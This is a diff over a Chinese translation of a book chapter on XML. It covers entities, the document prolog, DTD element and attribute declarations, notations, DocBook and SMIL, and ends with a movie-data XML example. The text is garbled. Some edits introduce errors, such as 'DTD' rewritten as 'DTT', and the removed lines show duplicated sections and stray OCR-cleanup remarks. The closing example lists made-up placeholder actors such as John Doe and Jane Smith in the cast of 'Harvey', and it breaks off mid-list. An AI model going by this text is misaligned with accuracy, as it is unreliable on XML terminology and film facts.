+XML 还引入了空元素或空标筓的概念。此类元素在其起始标签和结束标签之间不包含任何内容；它的“内容”可以被认为是构建在标签本身中的。HTML 中类似于 XML 空标签的示例有 `<br>`（换行标签）和 `<img>`（包含图形链接的标签）。在 XML 中，你可以通过两种方式之一编写空标签：
 
 ```xml
 <tagname></tagname>
@@ -10535,7 +12290,9 @@ XML 还引入了空元素或空标签的概念。此类元素在其起始标签�
 实体有几种类型：
 
 - 预定义实体：这些由 XML 规范定义并始终可用。例如，`&amp;` 代表和符号 (`&`)，`&lt;` 代表小于号 (`<`)，`&gt;` 代表大于号 (`>`)，`&apos;` 代表单引号 (`'`)，`&quot;` 代表双引号 (`"`)。
+
 - 自实体：由你在文档类型定义（DTD）中定义。它们允许你为字符串甚至整个文档创建自己的快捷方式。
+
 - 参数实体：仅在 DTD 内部使用，用百分号 (`%`) 表示。
 
 使用实体可以使你的文档更具读性和可维护性，特别是在处理长文本或频繁使用的字符时。然而，重要的是记住，实体必须在 DTD 中正确定义才能被解析器识别。
@@ -10546,11 +12303,8 @@ XML 还引入了空元素或空标签的概念。此类元素在其起始标签�
 
 在 HTML 中，当你需要标记一段包含许多此类特殊字符的长文本时，你有两个选择。第一，你可以将这些字符的所有出现处编码为实体引用。例如，HTML 中的 `&gt;` 实体会在该点插入字面上的“大于号”字符 `<`。或者，你可以将整个文本（包括特殊字符）封装在 `<pre>` 标签（或旧的 `<code>` 标签）中。
 
-
-
-
-
 # 392
+
 第 16 章 / XML
 
 如前所述，XML 允许使用第一种选择。当存在许多此类字符时，这会非常繁琐（而且结果难以阅读）；不幸的是，由于 XML 方言没有内置标签，你随后无法转向第二种选择。
@@ -10607,10 +12361,12 @@ XML 注释的形式与 HTML 中的注释相同。它们以以下方式开始：
 
 # 文整体结构 (Overall Document Structure)
 
-完整 XML 文档中的所有标记和文本组织成三个部分：
+完整 XML 文档中的所有标记和文本组成三个部分：
 
 - 可选的文档导言（prolog）
+
 - 文档根节点（root）
+
 - 可选的文档结语（epilogue）
 
 到目前为止，你主要将关注处理文档根节点，构成文档真实内容的所有元素和属性（以及可选的 PI 和注释）都包含其中。
@@ -10633,7 +12389,7 @@ XML 声明采用如下形式：
 
 编码（encoding）伪属性标识此文档中标记和文本所使用的字符编码。伪属性的值必须是标准 ISO 编码之一，例如 US-ASCII、UTF-8 等。
 
-最后，独立（standalone）伪属性断言此文档是完全自包含的——包括你的应用程序所需的关于文档结构的所有信息——或者关于结构的信息详细列在一个名为*文档类型定义*（DTD）的外部资源中。由于许多原因，XML 社区的共识是独立属性是多余的——有更好的方法来指示文档对 DTD 的依赖。因此，你可以合理地预计将完全缺失。
+最后，独立（standalone）伪属性断言此文档是完全自包含的——包括你的应用程所需的关于文档结构的所有信息——或者关于结构的信息详细列在一个名为*文档类型定义*（DTD）的外部资源中。由于许多原因，XML 社区的共识是独立属性是多余的——有更好的方法来指示文档对 DTD 的依赖。因此，你可以合理地预计将完全缺失。
 
 # 文档类型声明 (Document Type Declaration)
 
@@ -10647,9 +12403,9 @@ XML 声明采用如下形式：
 
 至于两个可选部分——*外部 DTD*（externalDTD）和*内部 DTD 子集*（internalDTDsubset）——它们提供了关于文档预期结构的信息：它可能包含哪些元素、它们可能具有哪些属性、各种元素之间的关系等。externalDTDlocation 是关键字 SYSTEM，后面跟着包含这些信息的文件的 URL；internalDTubset 提供了覆盖或补充信息。
 
-文档可以同时拥有外部 DTD 和内部子集，或者二选一，或者两者都无。如果存在完整的 DTD，则名称必须与 DTD 中元素的名称匹配。
+文档可以同时拥有外部 DTD 和内部子集，或者二选一，或者两者都无。如果存在完整的 DTT，则名称必须与 DTT 中元素的名称匹配。
 
-这里是一个同时使用外部 DTD 和内部子集的文档类型声明的示例：
+这里是一个同时使用外部 DTT和内部子集的文档类型声明的示例：
 
 ```
 <!DOCTYPE name SYSTEM externalDTDlocation [
@@ -10663,17 +12419,17 @@ XML 声明采用如下形式：
 
 # 有效文档与良好的格式文档 (Valid versus Well-Formed Documents)
 
-这是 XML 中一个非常重要的概念，代表了与 SGML 和 HTML 的决裂。良好的（well-formed）XML 文档遵循 XML 规范列出的通用原则，例如所有标签必须正确嵌套在另一个标签内部。有效的（valid）文档是良好的格式；然而，它还遵循关联 DTD 中列出的特定原则。你已经知道如何将 DTD 与文档关联（参见之前对文档类型声明的讨论）；DTD 中的内容是下一节的主题。
+这是 XML 中一个非常重要的概念，代表了与 SGML 和 HTML 的决裂。良好的（well-formed）XML 文档遵循 XML 规范列出的通用原则，例如所有标签必须正确嵌套在另一个标签内部。有效的（valid）文档是良好的格式；然而，它还遵循关联 DTT 中列出的特定原则。你已经知道如何将 DTT 与文档关联（参见之前对文档类型声明的讨论）；DTT 中的内容是下一节的主题。
 
 ## 文档类型定义 (DTD)
 
-DTD 像典型的 XML 文档一样只是一个文本文件。它的内容看起来像 XML，有很多 `<` 和 `>` 符号。DTD 并不是真正的 XML。它包含的是一组针对特定方言的 XML 文档结构和在某种程度上内容的正式规则。
+DTT 像典型的 XML 文档一样只是一个文本文件。它的内容看起来像 XML，有很多 `<` 和 `>` 符号。DTT 并不是真正的 XML。它包含的是一组针对特定方言的 XML 文档结构和在某种程度上内容的正式规则。
 
-有整本书在写关于如何创建和解释 DTD，因此在这里无法为你提供所有的细节。不过，我们可以查看一些基本原则。
+有整本书在写关于如何创建和解释 DTT，因此在这里无法为你提供所有的细节。不过，我们可以查看一些基本原则。
 
 ## 通用形式 (General Form)
 
-DTD 由一系列规则组成，采用这种通用形式：
+DTT 由一系列规则组成，采用这种通用形式：
 
 ```
 <!keyword constraints>
@@ -10683,7 +12439,7 @@ DTD 由一系列规则组成，采用这种通用形式：
 
 ## 元素关键字 (Element Keyword)
 
-有效 XML 文档中的每个元素——每个标签——必须在文档的 DTD 中有一个对应的 <!ELEMENT...> 定义。元素定义的通用格式为：
+有效 XML 文档中的每个元素——每个标签——必须在文档的 DTT 中有一个对应的 <!ELEMENT...> 定义。元素定义的通用格式为：
 
 ```
 <ELEMENT elementname (contentmodel)occurrencesflag >
@@ -10691,13 +12447,9 @@ DTD 由一系列规则组成，采用这种通用形式：
 
 elementname 是标签，不带 `<` 和 `>` 字符，正如它在符合文档中出现一样。（注意在 XML 中，不像
 
+## 文档类型定义 (DTT)
 
-
-
-
-## 文档类型定义 (DTD)
-
-HTML 中的所有元素、属性和其他标记组件都是区分大小写的。（例如，如 `<Street>` 的标签与 `<STREET>`、`<street>` 等标签是完全不同的。）
+HTML 中的所有元素、属性和其他标记组件都是区分大小写的。（例如，如 `<Street>` 的标签与 `<STREET>`、`<street>` 等标筓是完全不同的。）
 
 至于内容模型（content model），它定义了在合规文档中，该元素的特定出现处可以包含什么类型的内容。常见的内容模型说明“此元素可以包含纯文本”，并使用保留的术语 `#PCDATA` 来指定，如例所示：
 
@@ -10716,7 +12468,7 @@ Apartment B</street>
 
 > CDATA/标记部分可以出现在 #PCDATA 元素内容的任何地方。
 
-除了纯文本外，元素还可能包含其他元素——其中每个元素必须在 DTD 中有其自己的定义。例如，考虑这些元素定义：
+除了纯文本外，元素还可能包含其他元素——其中每个元素必须在 DTT 中有其自己的定义。例如，考虑这些元素定义：
 
 ```
 <ELEMENT streetaddress (housenumber, street, streetype) >
@@ -10727,6 +12479,8 @@ Apartment B</street>
 
 `streetaddress` 元素的内容模型说明它必须包含一个 `housenumber` 元素、一个 `street` 元素和一个 `streetype` 元素，顺序如下，如例所示：
 
+
+
 ```
 <streetaddress>
 <housenumber>123</housenumber>
@@ -10736,6 +12490,7 @@ Apartment B</street>
 ```
 
 注意，内容模型中使用逗号来表示序列。
+
 管道符/竖线字符 `|` 也可以代替使用；它的功能充当“或”（OR）运算符。例如：
 
 ```
@@ -10751,13 +12506,17 @@ Apartment B</street>
 ```
 
 这表示 `cityregion` 元素由一个 `cityName` 后跟一个 `state` 或一个 `cityName` 后跟一个 `province` 组成。
+
 在上述 `ELEMENT` 定义的基本形式中，注意还有一个“出现次数标记”（occurrences flag）。这是一个可选的单字符指示，用于指示指定的内容模型出现的次数，可以是以下值之一：
 
 - + 可选的；可以出现一次或多次
+
 - ? 可选的；如果出现，则可以出现一次
+
 - * 可选的；可以出现任意次数
 
 这些出现次数标记的每个值也可以应用于内容模型的各个部分（#PCDATA 除外）。如果完全没有出现次数标记，则有效出现次数为一次且仅此一次。
+
 配合序列（逗号）和可选性（管道符/竖线）运算符，并使用括号对内容模型的部分进行分组，出现次数标记使得极其复杂的内容模型成为可能。例如：
 
 ```
@@ -10803,10 +12562,10 @@ DTD 的设计者可以使用特殊关键字 `EMPTY` 指定元素在其内容模�
 `ATTLIST` 是设计者指定元素属性的地方。`ATTLIST` 的通用形式为：
 
 ```
-<!ATIST elename attribname [...]
+<!ATTLIST elename attribname [...]>
 ```
 
-`ename` 和 `attribname` 分而易见地分别是可以应用该属性的元素名称和属性本身的名称。`[...]` 意味着 `ATTLIST` 可以包含设计者想要的任意多个 `attribname` 值对。
+`elename` 和 `attribname` 分别表示可以应用该属性的元素名称和属性本身的名称。`[...]` 意味着 `ATTLIST` 可以包含设计者想要的任意多个 `attribname` 值对。
 
 ## 属性类型规范
 
@@ -10816,15 +12575,15 @@ DTD 的设计者可以使用特殊关键字 `EMPTY` 指定元素在其内容模�
 <!ATLIST person gender (male | female | unknown)>
 ```
 
-这表示 元素的 `gender` 属性可以是 male、female 或 unknown 三值之一。该属性的任何其他值都将被拒绝为无效。
+这表示 `person` 元素的 `gender` 属性可以是 `male`、`female` 或 `unknown` 三值之一。该属性的任何其他值都将被拒绝为无效。
 
 字符串属性值简单表示属性值由任何文本字符组成。属性类型位置的 `CDATA` 关键字（如 XML 文档的标记部分中使用该关键字）声明该属性的情况如下，例如：
 
 ```
-<ATLIST website href CDATA >
+<!ATLIST website href CDATA >
 ```
 
-再次，省略了默认规范。）CDATA 属性中任何像标记的内容以及所有其他文本（甚至是空格）都由解析器原封不动地传递下游应用程序。
+（再次，省略了默认规范。）CDATA 属性中任何像标记的内容以及所有其他文本（甚至是空格）都由解析器原封不动地传递下游应用程序。
 
 最后，标记化属性类型使用以下关键字指定：`ID`、`IDREF`、`IDREFS`、`ENTITY`、`ENTITIES`、`NMTOKEN` 和 `NMTOKENS`。这些每个关键字都根据其所属的文档或 DTD 的其余部分来约束属性值。
 
@@ -10833,7 +12592,7 @@ DTD 的设计者可以使用特殊关键字 `EMPTY` 指定元素在其内容模�
 ID 属性值在给定文档的所有该元素的 ID 属性值中必须是唯一的。它不能是纯数字，必须以至少一个字母开头。一个示例声明所示：
 
 ```
-<ATLIST person id ID >
+<!ATLIST person id ID >
 ```
 
 并在文档中如下使用：
@@ -10844,10 +12603,6 @@ ID 属性值在给定文档的所有该元素的 ID 属性值中必须是唯一�
 
 重要的一点是，ID 类型属性并不是为了“识别”（在此例中）一个人；它是为了“识别” 元素的特定出现处。ID 类型属性主要用于配合 `IDREF/IDREFS` 属性使用，如文所述。
 
-
-
-
-
 ## IDREF- 和 IDREFS- 类型属性
 
 这些属性旨在与 ID 类型的属性配合使用，作为一种内置的文档内交叉引用或链接。如你所知，在 HTML 中，`<a>` 标签的 `href` 属性可以使用 `#location` 格式指向文档中 `<a>` 标签出现的位置。（目标位置本身必须用 `<a name="location">` 标签标记。）这与使用 IDREF/IDREFS 属性指向 ID 属性具有直接的类比性。
@@ -10857,9 +12612,9 @@ ID 属性的值必须是文档中某处 ID 属性的值；IDREFS 属性的取值
 考虑一个用于向潜在求职者和客户描述公司的 XML 应用程序。我们可能会在该应用程序的 DTD 中发现如下 `ATTLIST` 声明：
 
 ```xml
-<ATTLIST contacttype ID >
-<!ATTLIST appinfo hrcontact IDREF >
-<!ATTLIST custinfo officecontacts IDREFS >
+<!ATTLIST contacttype ID>
+<!ATTLIST appinfo hrcontact IDREF>
+<!ATTLIST custinfo officecontacts IDREFS>
 ```
 
 基于此 DTD 的文档可能会包含以下片段：
@@ -10886,12 +12641,12 @@ Contact our sales offices
 
 ## ENTITY-/ENTITIES- 类型属性
 
-我们还没有看到实体在 DTD 中是如何定义的。尽管如此，通常，ENTITY 类型属性的值必须是 DTD 中定义的实体名称；属性中使用的名称不包含引用该实体时使用的取符号（`&`）和分号（`;`）。ENTITY 类型属性的值必须是一个由空格分隔的一个或多个实体名称的列表。）
+我们还没有看到实体在 DTD 中是如何定义的。尽管如此，通常，ENTITY 类型属性的值必须是 DTD 中定义的实体名称；属性中使用的名称不包含引用该实体时使用的取符号（`&`）和分号（`;`）。ENTITY 类型属性的值必须是一个由空格分隔的一个或多个实体名称的列表。
 
 问题之处在于，这些属性中使用的实体名称必须是一种特殊实体的名称，即外部二进制实体。这是位于 DTD 和文档本身之外的某处的非解析（即非 XML）资源，例如图像或其他多媒体文件。例如，假设 DTD 定义了一个名为 `logo` 的实体，该实体用于标识公司图形符号的位置。DTD 中的一个 `ATTLIST` 类型属性可能定义为：
 
 ```xml
-<!ATTLIST corpsymbol img ENTITY >
+<!ATTLIST corpsymbol img ENTITY>
 ```
 
 而文档可能包含：
@@ -10909,7 +12664,7 @@ Contact our sales offices
 给定以下声明：
 
 ```xml
-<!ATTLIST spreadsheet type NMTOKENS >
+<!ATTLIST spreadsheet type NMTOKENS>
 ```
 
 一个有效的 XML 文档可能包含以下片段：
@@ -10933,8 +12688,7 @@ Contact our sales offices
 最简单的默认规范是让 DTD 作者分配一个特定的默认值，如下：
 
 ```xml
-<ATTLIST person gender
-(male | female | unknown) "unknown" >
+<!ATTLIST person gender (male | female | unknown) "unknown">
 ```
 
 这意味着如果文档中 `person` 元素的特定实例没有 `gender` 属性，应用程序应该假设该值为 "unknown"。
@@ -10950,7 +12704,7 @@ DTD 也可以通过使用特殊的 `#REQUIRED` 关键字断言文档必须为属
 如果 DTD 作者不在意除类型规范可能施加的限制之外的任何方式限制属性值，可以使用 `#IMPLIED` 关键字，如下：
 
 ```xml
-<ATTLIST person name CDATA #IMPLIED >
+<!ATTLIST person name CDATA #IMPLIED>
 ```
 
 在这种情况下，如果特定的 `person` 元素没有关联的 `name` 属性，XML 解析器不会假设任何默认值。
@@ -10965,10 +12719,12 @@ DTD 也可以通过使用特殊的 `#REQUIRED` 关键字断言文档必须为属
 
 ## ENTITY 关键字
 
-我们还没有看到实体在 DTD 中是如何定义的。尽管如此，通常，ENTITY 类型属性的值必须是 DTD 中定义的实体名称；属性中使用的名称不包含引用该实体时使用的取符号（`&`）和分号（`;`）。ENTITY 类型属性的值必须是一个由空格分隔的一个或多个实体名称的列表。）问题之处在于，这些属性中使用的实体名称必须是一种特殊实体的名称，即外部二进制实体。这是位于 DTD 和文档本身之外的某处的非解析（即非 XML）资源，例如图像或其他多媒体文件。例如，假设 DTD 定义了一个名为 `logo` 的实体，该实体用于标识公司图形符号的位置。DTD 中的一个 `ATTLIST` 类型属性可能定义为：
+我们还没有看到实体在 DTD 中是如何定义的。尽管如此，通常，ENTITY 类型属性的值必须是 DTD 中定义的实体名称；属性中使用的名称不包含引用该实体时使用的取符号（`&`）和分号（`;`）。ENTITY 类型属性的值必须是一个由空格分隔的一个或多个实体名称的列表。
+
+问题之处在于，这些属性中使用的实体名称必须是一种特殊实体的名称，即外部二进制实体。这是位于 DTD 和文档本身之外的某处的非解析（即非 XML）资源，例如图像或其他多媒体文件。例如，假设 DTD 定义了一个名为 `logo` 的实体，该实体用于标识公司图形符号的位置。DTD 中的一个 `ATTLIST` 类型属性可能定义为：
 
 ```xml
-<!ATTLIST corpsymbol img ENTITY >
+<!ATTLIST corpsymbol img ENTITY>
 ```
 
 而文档可能包含：
@@ -10986,7 +12742,7 @@ DTD 也可以通过使用特殊的 `#REQUIRED` 关键字断言文档必须为属
 给定以下声明：
 
 ```xml
-<!ATTLIST spreadsheet type NMTOKENS >
+<!ATTLIST spreadsheet type NMTOKENS>
 ```
 
 一个有效的 XML 文档可能包含以下片段：
@@ -11008,8 +12764,7 @@ DTD 也可以通过使用特殊的 `#REQUIRED` 关键字断言文档必须为属
 `ATTLIST` 声明中在其类型之后的部分用于声明 DTD 是否提供了默认值、文档是否必须提供值等。这些内容合称为属性的**默认规范**。最简单的默认规范是让 DTD 作者分配一个特定的默认值，如下：
 
 ```xml
-<ATTLIST person gender
-(male | female | unknown) "unknown" >
+<!ATTLIST person gender (male | female | unknown) "unknown">
 ```
 
 这意味着如果文档中 `person` 元素的特定实例没有 `gender` 属性，应用程序应该假设该值为 "unknown"。
@@ -11025,7 +12780,7 @@ DTD 也可以通过使用特殊的 `#REQUIRED` 关键字断言文档必须为属
 如果 DTD 作者不在意除类型规范可能施加的限制之外的任何方式限制属性值，可以使用 `#IMPLIED` 关键字，如下：
 
 ```xml
-<ATTLIST person name CDATA #IMPLIED >
+<!ATTLIST person name CDATA #IMPLIED>
 ```
 
 在这种情况下，如果特定的 `person` 元素没有关联的 `name` 属性，XML 解析器不会假设任何默认值。最后，还有一种奇怪的默认规范，由 `#FIXED` 关键字和引号中的值指示。例如：
@@ -11043,43 +12798,39 @@ Notations 是 SGML 的遗留。基本上，它们的目的是定义一类可能�
 标记 声明的通用格式是：
 
 ```xml
-<!NOTATION notationname externalID >
+<!NOTATION notationname externalID>
 ```
 
 重复一遍：notations 并不定义特定的非 XML 内容，如“logo.gif”或“soundtrack.mp3”，而是定义非 XML 内容类别，如“gif”或“mp3”。声明的 `externalID` 部分指向某种“知道”这种特定类别内容的外部资源。至少在空间上，`externalID` 最熟悉的形式使用 `SYSTEM` 关键字和 URL，如下：
 
 ```xml
-<!NOTATION realaudio SYSTEM "http://www.real.com" >
+<!NOTATION realaudio SYSTEM "http://www.real.com">
 ```
 
 问题在于，该 URL 并没有可以处理 RealAudio 文件的特定内容；可以确定，它是压缩格式的——但需要下载和安装。
-
-
-
 
 ## XML 应用
 
 因此，你可以假设程序已经安装，并使用类似下面的代码：
 
-```
-<INOTATION SYSTEM
-"file:///C:\Program Files\Real\rplayer.exe" >
+```xml
+<!NOTATION SYSTEM "file:///C:\Program Files\Real\rplayer.exe">
 ```
 
 当然，一旦有人将程序安装到不同的文件夹，这种方法就失效了，更不用说如果他们使用的是非微软文件系统了。
 
-（此外，DTD 可以将 `SYSTEM` 关键字替换为 `PUBLIC`，并将 URL 替换为该媒体类型的标准“目录名称”。尽管这有一个优势——避开了关于 URL 到底指向什么的整个疑问——但它也有一个主要的缺点：极少数非 SGML 的死忠者知道（甚至知道如何使用）这些 **`PUBLIC`** 标识符。）
+（此外，DTD 可以将 `SYSTEM` 关键字替换为 `PUBLIC`，并将 URL 替换为该媒体类型的标准“目录名称”。尽管这有一个优势——避开了关于 URL 到底指向什么的整个疑问——但它也有一个主要的缺点：极少数非 SGML 的死忠者知道（甚至知道如何使用）这些 `PUBLIC` 标识符。）
 
-再次，由于上述所有原因，在可预见的未来，你不太会在 XML 文档中遇到标记（notations）。如果你遇到了，你会发现它们与一种特殊形式的实体——外部二进制实体配合使用。这些实体使用以下语法声明：
+再次，由于上述所有原因，在可预见的未来，你不太会在 XML 文档中遇到标记。如果你遇到了，你会发现它们与一种特殊形式的实体——外部二进制实体配合使用。这些实体使用以下语法声明：
 
-```
-<ENTITY entname SYSTEM "url" NDATA notationname >
+```xml
+<!ENTITY entname SYSTEM "url" NDATA notationname>
 ```
 
 `notationname` 必须与之前在 DTD 中声明的标记名称匹配，例如，在这个实体声明中：
 
-```
-<ENTITY corplogo SYSTEM "images/logo.jpg" NDATA jpg >
+```xml
+<!ENTITY corplogo SYSTEM "images/logo.jpg" NDATA jpg>
 ```
 
 其中名为 "jpg" 的标记必须之前已经定义。通过这种方式协同工作，实体和标记声明分别告诉下游应用需要检索哪个特定的外部资源，以及如何处理它。
@@ -11131,16 +12882,6 @@ SMIL 是由 RealNetworks 和其他供应商提出的标准，并于 1998 年 6 �
 
 ## XML 看起来是什么样？
 
-被这些关于 XML 内部细节的信息淹没后，你可能会想是否可以在普通的 Web 浏览器中查看它。几件事使得回答这个问题变得比应有的更复杂。
-
-首先，尽管截至本文编写时核心 XML 规范已有 18 个月历史，但许多重要的标准（如提供功能的 XLink 和 XPath）尚未完成。其次，如果浏览器预先不知道它需要哪些标签，它将如何知道呢？正如之前暗示的，答案是，所有想要显示的内容都必须在外部样式表中定义。
-
-![](img/60cf9e8f697416e18e3ca18e3d4f7f4e_431_0.png)
-
-**图 16.2** 使用 Internet Explorer 显示 XML。
-
-## XML 看起来是什么样？
-
 被这些所有关于 XML 内部细节的信息淹没后，你可能会想是否可以在普通的 Web 浏览器中查看它。几件事使得回答这个问题变得比应有的更复杂。
 
 首先，尽管截至本文编写时核心 XML 规范已有 18 个月历史，但许多重要的标准（如提供功能的 XLink 和 XPath）尚未完成。其次，如果浏览器预先不知道它需要哪些标签，它将如何知道呢？正如之前暗示的，答案是，所有想要显示的内容都必须在外部样式表中定义。
@@ -11148,118 +12889,6 @@ SMIL 是由 RealNetworks 和其他供应商提出的标准，并于 1998 年 6 �
 ![](img/60cf9e8f697416e18e3ca18e3d4f7f4e_431_0.png)
 
 **图 16.2** 使用 Internet Explorer 显示 XML。
-
-## XML 看起来是什么样？
-
-被这些所有关于 XML 内部细节的信息淹没后，你可能会想是否可以在普通的 Web 浏览器中查看它。几件事使得回答这个问题变得比应有的更复杂。
-
-首先，尽管截至本文编写时核心 XML 规范已有 18 个月历史，但许多重要的标准（如提供功能的 XLink 和 XPath）尚未完成。其次，如果浏览器预先不知道它需要哪些标签，它将如何知道呢？正如之前暗示的，答案是，所有想要显示的内容都必须在外部样式表中定义。
-
-![](img/60cf9e8f697416e18e3ca18e3d4f7f4e_431_0.png)
-
-**图 16.2** 使用 Internet Explorer 显示 XML。
-
-## XML 看起来是什么样？
-
-被这些所有关于 XML 内部细节的信息淹没后，你可能会想是否可以在普通的 Web 浏览器中查看它。几件事使得回答这个问题变得比应有的更复杂。
-
-首先，尽管截至本文编写时核心 XML 规范已有 18 个月历史，但许多重要的标准（如提供功能的 XLink 和 XPath）尚未完成。其次，如果浏览器预先不知道它需要哪些标签，它将如何知道呢？正如之前暗示的，答案是，所有想要显示的内容都必须在外部样式表中定义。
-
-（注：提供的 OCR 文本存在重复/乱码，我将根据文本的逻辑进展进行清理。）
-
-*纠错：根据提供的 OCR 碎片，重新处理第 431 页。*
-
----
-
-**最终清理输出：**
-
-[content]
-## XML 应用
-
-你可以假设程序已经安装，并使用类似下面的代码：
-
-```
-<INOTATION SYSTEM
-"file:///C:\Program Files\Real\rplayer.exe" >
-```
-
-当然，一旦有人将程序安装到不同的文件夹，这种方法就失效了，更不用说如果他们使用的是非微软文件系统了。
-
-（此外，DTD 可以 `SYSTEM` 关键字替换为 `PUBLIC`，并将 URL 替换为该媒体类型的标准“目录名称”。尽管这有一个优势——避开了关于 URL 到底指向什么的整个疑问——但它也有一个主要的缺点：极少数非 SGML 的死忠者知道（甚至知道如何使用）这些 `PUBLIC` 标识符。）
-
-再次，由于上述所有原因，在可预见的未来，你不太会在 XML 文档中遇到标记。如果你遇到了，你会发现它们与一种特殊形式的实体——外部二进制实体配合使用。这些实体使用以下语法声明：
-
-```
-<ENTITY entname SYSTEM "url" NDATA notationname >
-```
-
-`notationname` 必须与之前在 DTD 中声明的标记名称匹配，例如，在这个实体声明中：
-
-```
-
-<ENTITY corplogo SYSTEM "images/logo.jpg" NDATA jpg >
-```
-
-其中名为 "jpg" 的标记必须之前已经定义。通过这种方式协同工作，实体和标记声明分别告诉下游应用需要检索哪个特定的外部资源，以及如何处理它。
-
-## XML 应用
-
-随着围绕 XML 作为解决电子商务问题、搜索引擎问题等工具的各种炒作，你可能会认为会有大量现有的应用。事实也如此。我们在这里简要查看两个：DocBook 和 SMIL。
-
-## DocBook
-
-DocBook 自 20 世纪 90 年初以来一直存在，由一个代表了如出版商 O'Reilly and Associates、Sun、Novell、Hewlett-Packard 等供应商的联盟开发。它目前由非营利组织 OASIS（结构化信息系统促进组织）维护。它在发布任何类型技术文档的组织中广泛使用，包括原始 OASIS 之前版本的创建者。尽管如此，它并没有什么特别的限制将其用途限制在技术书籍和论文上。
-
-## 注意
-
-PHP 文档使用了 DocBook DTD。
-
-（正如你可能从前一段的日期推测出的那样，“官方”的 DocBook 早于 XML 标准，是纯 SGML。然而，截至本文编写时，一个非官方的 XML 版本已达到 3.1 版。）
-
-DocBook DTD（实际上是一组通过使用参数实体组成“虚拟 DTD”的 DTD 集）非常庞大且复杂。通常，一个 DocBook 文档包含预期的标签，如 `<book>` 和 `<chapter>`，但也可能包含此类晦涩的项目，如 `<colophon>`、`<seeIE>`（索引中的“参见某条目”）等。
-
-## 同步多媒体集成语言 (SMIL)
-
-SMIL 是由 RealNetworks 和其他供应商提出的标准，并于 1998 年6 月正式接受为 W3C 建议。SMIL 文档用于指定流媒体演示的布局、顺序和时序。例如，你可以构建一个重复的幻灯片，它由文本（可能是闭式字幕）组成，并与电影和或音频片段同步。（此时，只有其中一个——RealNetworks 拥有的 G2 RealPlayer——足够流行，因此值得关注。）每个 SMIL 文档都由标记标题、布局和实际内容的标签组成。这是一个来自 RealNetworks "DevZone" 网站的示例：
-
-```xml
-<smil>
-<head>
-  <layout>
-    <root-layout width="320" height="272"/>
-    <region id="pix_region" width="320" height="240" left="0" top="0"/>
-    <region id="text_region" width="320" height="32" left="0" top="240"/>
-  </layout>
-</head>
-<body>
-  <par>
-    <audio src="audio/music.rm"/>
-    <img src="audio/slides.rp" region="pix_region"/>
-    <textstream src="text/text.rt" region="text_region"/>
-  </par>
-</body>
-</smil>
-```
-
-注意 `<layout>` 部分中 `<region>` 标签的 `id` 属性与 `<par>` 部分中各种标签的 `region` 属性之间的关联。这些属性指定了哪种内容和什么类型的内容将占据 SMIL 视器窗口的各个区域。结果如图 16.1 所示。这张截图是在演示开始后不久拍摄的。当然，后来各个区域将被不同的图像和文本占据。
-
-![](img/60cf9e8f697416e18e3ca18e3d4f7f4e_430_0.png)
-
-**图 16.1** 使用 RealPlayer 查看 SMIL 文件。
-
-## XML 看起来是什么样？
-
-被这些所有关于 XML 内部细节的信息淹没后，你可能会想是否可以在普通的 Web 浏览器中查看它。几件事使得回答这个问题变得比应有的更复杂。
-
-首先，尽管截至本文编写时核心 XML 规范已有 18 个月历史，但许多重要的标准（如提供功能的 XLink 和 XPath）尚未完成。其次，如果浏览器预先不知道它需要哪些标签，它将如何知道呢？正如之前暗示的，答案是，所有想要显示的内容都必须在外部样式表中定义。
-
-![](img/60cf9e8f697416e18e3ca18e3d4f7f4e_431_0.png)
-
-**图 16.2** 使用 Internet Explorer 显示 XML。
-
-
-
-
 
 # 摘要
 
@@ -11289,7 +12918,7 @@ XML 与 HTML 不同，因为它需要平衡标签、保留空白完整性（如�
 
 处理指令 (PIs) 可以用于任何 XML 文档。如果 XML 处理器不认识特定指令，它就会被忽略。PHP 使用 `<?php ... ?>` 处理指令。
 
-XML 可选择地包含一个引言，其中可以包含注释、处理指令、XML 声明和文档类型声明 (DTD)。XML 声明指定了正在使用的 XML 版本（目前为“1.0”）、字符编码方案，以及文档是否独立。DTD 标签指定了处理 XML 文档是否需要 DTD。
+XML 可选择地包含一个引言，其中可以包含注释、处理指令、XML 声明和文档类型声明 (DTD)。XML 声明指定了正在使用的 XML 版本（目前为“1.0”）、字符编码方案，以及文档是否独立。DTD 标筓指定了处理 XML 文档是否需要 DTD。
 
 DTD 的构建过于复杂，无法用一两句话来总结。然而，DTD 背后的思想并不复杂。DTD 告诉解析器（或处理器）程序 XML 应该什么样子——允许哪些标签和属性以及它们的顺序。
 
@@ -11340,133 +12969,261 @@ ELEMENT MOVIE (CATEGORIES,ACTORS)>
 # 获取电影信息
 
 ```xml
+
 <!ATTLIST MOVIE
+
 TITLE CDATA #IMPLIED
+
 YEAR CDATA #IMPLIED>
+
 <!ELEMENT CATEGORIES (GENRE)*>
+
 <!ELEMENT GENRE (#PCDATA)>
+
 <!ELEMENT ACTORS (ACTOR)*>
+
 <!ELEMENT ACTOR (FN,LN)>
+
 <!ELEMENT FN (#PCDATA)>
+
 <!ELEMENT LN (#PCDATA)>
+
 >
+
 <W4F_DOC>
+
 <MOVIE TITLE="Harvey" YEAR="1950">
+
 <CATEGORIES>
+
 <GENRE>Comedy</GENRE>
+
 </CATEGORIES>
+
 <ACTORS>
+
 <ACTOR>
+
 <FN>James</FN>
+
 <LN>Stewart</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Josephine</FN>
+
 <LN>Hull</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Peggy</FN>
+
 <LN>Dow</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Sam</FN>
+
 <LN>Wolfe</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>John</FN>
+
 <LN>Doe</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Jane</FN>
+
 <LN>Smith</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Michael</FN>
+
 <LN>Brown</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Alice</FN>
+
 <LN>White</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Bob</FN>
+
 <LN>Davis</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>David</FN>
+
 <LN>Miller</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Edward</FN>
+
 <LN>Moore</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Frank</FN>
+
 <LN>Taylor</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Grace</FN>
+
 <LN>Anderson</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Henry</FN>
+
 <LN>Thomas</LN>
+
 </ACTOR>
+
 <ACTOR>
+
 <FN>Ivy</FN>
+
 <LN>Jackson</LN>
+
 </ACTOR>
